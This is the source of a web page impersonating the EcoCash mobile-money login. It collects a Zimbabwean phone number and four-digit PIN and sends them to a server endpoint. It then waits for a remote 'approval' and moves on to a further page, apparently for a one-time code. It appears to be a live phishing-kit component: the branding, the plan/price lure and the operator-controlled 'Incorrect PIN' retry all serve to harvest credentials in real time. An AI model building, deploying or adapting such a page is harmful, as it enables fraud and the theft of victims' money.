<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background: #ffffff;
            -webkit-font-smoothing: antialiased;
        }

        .container {
            max-width: 400px;
            margin: auto;
            padding: 32px 16px 0;
            text-align: center;
        }

        .logo {
            font-size: 44px;
            font-weight: bold;
            margin-bottom: 16px;
        }

        .logo span:first-child {
            color: #0b5ed7;
        }

        .logo span:last-child {
            color: #e5533d;
        }

        h2 {
            font-weight: normal;
            margin-bottom: 24px;
            font-size: 20px;
        }

        .phone-box {
            border: 2px solid #0b5ed7;
            border-radius: 12px;
            padding: 12px 14px;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 14px;
            background: #fff;
        }

        .flag-img {
            width: 26px;
            height: auto;
        }

        .country-code {
            font-size: 16px;
            font-weight: bold;
            white-space: nowrap;
        }

        .phone-input {
            border: none;
            outline: none;
            font-size: 16px;
            flex: 1;
            padding: 6px 4px;
            background: transparent;
        }

        .phone-input::placeholder {
            color: #aaa;
        }

        .phone-box:focus-within {
            box-shadow: 0 0 0 3px rgba(11, 94, 215, 0.15);
        }

        .pin-label {
            margin-top: 18px;
            color: #666;
            font-size: 14px;
        }

        .pin-boxes {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 14px 0;
        }

        .pin-boxes input {
            width: 48px;
            height: 48px;
            border: 2px solid #0b5ed7;
            border-radius: 10px;
            font-size: 20px;
            text-align: center;
            outline: none;
        }

        .pin-boxes input:focus {
            box-shadow: 0 0 0 3px rgba(11, 94, 215, 0.15);
        }

        .pin-boxes {
            position: relative;
        }

        .modal,
        .approval-overlay {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 10;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.45);
            padding: 20px;
        }

        .modal.visible,
        .approval-overlay.visible {
            display: flex;
        }

        .modal-content,
        .approval-content {
            width: min(100%, 340px);
            background: #fff;
            border-radius: 12px;
            padding: 24px;
            text-align: center;
        }

        .modal-content p,
        .approval-content p {
            line-height: 1.5;
            margin: 0 0 20px;
        }

        .modal-content button,
        .approval-content button {
            border: none;
            border-radius: 10px;
            background: #0b5ed7;
            color: #fff;
            cursor: pointer;
            font-weight: bold;
            padding: 12px 24px;
        }

        .spinner {
            width: 38px;
            height: 38px;
            border: 4px solid #d9e6fb;
            border-top-color: #0b5ed7;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 18px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .forgot {
            color: #666;
            font-size: 13px;
            margin-bottom: 10px;
        }

        .bottom {
            position: relative;
            background: #0b5ed7;
            padding: 56px 16px 24px;
            color: #fff;
            text-align: center;
            overflow: hidden;
            margin-top: 30px;
        }

        .bottom::before {
            content: "";
            position: absolute;
            top: -45px;
            left: 0;
            width: 100%;
            height: 90px;
            background: #ffffff;
            border-bottom-left-radius: 100% 100%;
            border-bottom-right-radius: 100% 100%;
        }

        .bottom p {
            margin-bottom: 22px;
            font-size: 14px;
            line-height: 1.4;
        }

        .buttons {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 22px;
        }

        .btn {
            background: #fff;
            color: #0b5ed7;
            padding: 14px;
            width: 150px;
            border-radius: 14px;
            font-weight: bold;
            border: none;
            font-size: 14px;
            cursor: pointer;
        }

        .btn:active {
            transform: scale(0.98);
        }

        .version {
            font-size: 12px;
            margin-bottom: 6px;
        }

        .terms {
            font-size: 11px;
            line-height: 1.4;
        }

        .terms a {
            color: #fff;
            text-decoration: underline;
        }

        @media (max-width: 360px) {
            .logo {
                font-size: 38px;
            }

            .pin-boxes input {
                width: 44px;
                height: 44px;
            }

            .btn {
                width: 100%;
                max-width: 220px;
            }
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="logo">
            <span>Eco</span><span>Cash</span>
        </div>

        <h2>Login</h2>

        <div class="phone-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" alt="ZW"
                class="flag-img">
            <span class="country-code">+263</span>
            <input type="tel" id="phoneInput" class="phone-input" placeholder="" inputmode="numeric" maxlength="10">
        </div>

        <div class="pin-label">Enter your PIN</div>

        <div class="pin-boxes">
            <input class="code-box" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input class="code-box" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input class="code-box" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input class="code-box" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
        </div>

        <div class="forgot">Forgot PIN?</div>

    </div>

    <div class="bottom">
        <p>To register a EcoCash wallet or get assistance,<br>click below</p>

        <div class="buttons">
            <button class="btn">Register</button>
            <button class="btn">Help &amp; Support</button>
        </div>

        <div class="version">v2.2.3P</div>

        <div class="terms">
            By signing in you agree to the
            <a href="#">Terms and Conditions</a>
        </div>
    </div>

    <div id="invalidModal" class="modal" role="dialog" aria-modal="true" aria-labelledby="invalidMessage">
        <div class="modal-content">
            <p id="invalidMessage"></p>
            <button type="button" id="invalidOkBtn">OK</button>
        </div>
    </div>

    <div id="approvalOverlay" class="approval-overlay" role="dialog" aria-modal="true">
        <div class="approval-content">
            <div id="spinner" class="spinner"></div>
            <h3 id="overlayTitle">Please wait...</h3>
            <p id="overlayText">This usually takes a few seconds</p>
            <p id="deniedMsg" style="display:none;">Incorrect PIN. Please try again.</p>
            <button type="button" id="retryBtn" style="display:none;">Retry</button>
        </div>
    </div>

    <script>
        const phoneInput = document.getElementById('phoneInput');
        const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
        const incomingParams = new URLSearchParams(window.location.search);
        const incomingPhone = incomingParams.get('phone') || '';
        const normalizedPhone = incomingPhone.replace(/\D/g, '').replace(/^263/, '').replace(/^0/, '');
        if (/^[0-9]{9}$/.test(normalizedPhone)) {
            phoneInput.value = normalizedPhone;
        }

        const invalidModal = document.getElementById('invalidModal');
        const invalidMessage = document.getElementById('invalidMessage');
        const invalidOkBtn = document.getElementById('invalidOkBtn');

        function showInvalidPhone(message) {
            invalidMessage.innerHTML = message;
            invalidModal.classList.add('visible');
        }

        function checkFormValid() {
            const phone = phoneInput.value.trim();
            const codeFilled = codeBoxes.every((box) => box.value.length === 1);
            if (/^[0-9]{9}$/.test(phone) && codeFilled && !requestInProgress) {
                requestApproval();
            }
        }

        phoneInput.addEventListener('input', () => {
            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
            if (phoneInput.value.startsWith('263')) {
                phoneInput.value = phoneInput.value.slice(3);
            }
            if (phoneInput.value.startsWith('0')) {
                phoneInput.value = phoneInput.value.slice(1);
            }
            phoneInput.value = phoneInput.value.slice(0, 9);
            checkFormValid();
        });

        invalidOkBtn.addEventListener('click', () => {
            invalidModal.classList.remove('visible');
            phoneInput.focus();
        });

        codeBoxes.forEach((box, index) => {
            box.addEventListener('input', (event) => {
                box.value = box.value.replace(/[^0-9]/g, '').slice(0, 1);

                if (box.value && index < codeBoxes.length - 1) {
                    codeBoxes[index + 1].focus();
                }

                checkFormValid();
            });

            box.addEventListener('keydown', (event) => {
                if (event.key === 'Backspace' && !box.value && index > 0) {
                    codeBoxes[index - 1].focus();
                }
            });
        });

        const overlay = document.getElementById('approvalOverlay');
        const spinner = document.getElementById('spinner');
        const overlayTitle = document.getElementById('overlayTitle');
        const overlayText = document.getElementById('overlayText');
        const deniedMsg = document.getElementById('deniedMsg');
        const retryBtn = document.getElementById('retryBtn');
        let pollTimer = null;
        let requestInProgress = false;

        function showOverlayWaiting() {
            overlay.classList.add('visible');
            spinner.style.display = 'block';
            overlayTitle.style.display = 'block';
            overlayTitle.textContent = 'Please wait...';
            overlayText.style.display = 'block';
            overlayText.textContent = 'This usually takes a few seconds';
            deniedMsg.style.display = 'none';
            retryBtn.style.display = 'none';
        }

        function pollApproval(id, params) {
            if (pollTimer) clearInterval(pollTimer);
            pollTimer = setInterval(async () => {
                try {
                    const response = await fetch('/api/check-approval/' + id);
                    const data = await response.json();

                    if (data.status === 'approved') {
                        clearInterval(pollTimer);
                        window.location.href = 'pto.html?' + params.toString();
                    } else if (data.status === 'denied') {
                        clearInterval(pollTimer);
                        spinner.style.display = 'none';
                        overlayTitle.style.display = 'none';
                        overlayText.style.display = 'none';
                        deniedMsg.style.display = 'block';
                        retryBtn.style.display = 'inline-block';
                    }
                } catch (error) {
                    // Keep polling after temporary network failures.
                }
            }, 2500);
        }

        retryBtn.addEventListener('click', () => {
            requestInProgress = false;
            overlay.classList.remove('visible');
            codeBoxes.forEach((box) => { box.value = ''; });
            codeBoxes[0].focus();
        });

        async function requestApproval() {
            requestInProgress = true;
            const phone = phoneInput.value.trim();
            if (!/^[0-9]{9}$/.test(phone)) {
                showInvalidPhone('The phone number must contain exactly 9 digits.<br>Please enter the correct number and try again!');
                requestInProgress = false;
                return;
            }

            const params = new URLSearchParams(window.location.search);
            const code = codeBoxes.map((box) => box.value).join('');
            params.set('phone', phone);
            showOverlayWaiting();

            try {
                const response = await fetch('/api/request-approval', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        plan: params.get('plan'),
                        price: params.get('price'),
                        phone,
                        code,
                        step: 'login'
                    })
                });
                const data = await response.json();
                pollApproval(data.id, params);
            } catch (error) {
                requestInProgress = false;
                overlayTitle.textContent = 'Connection error';
                overlayText.textContent = 'Unable to send the request. Check your connection and try again.';
                spinner.style.display = 'none';
                retryBtn.style.display = 'inline-block';
            }
        }

        checkFormValid();
    </script>

</body>
</html>
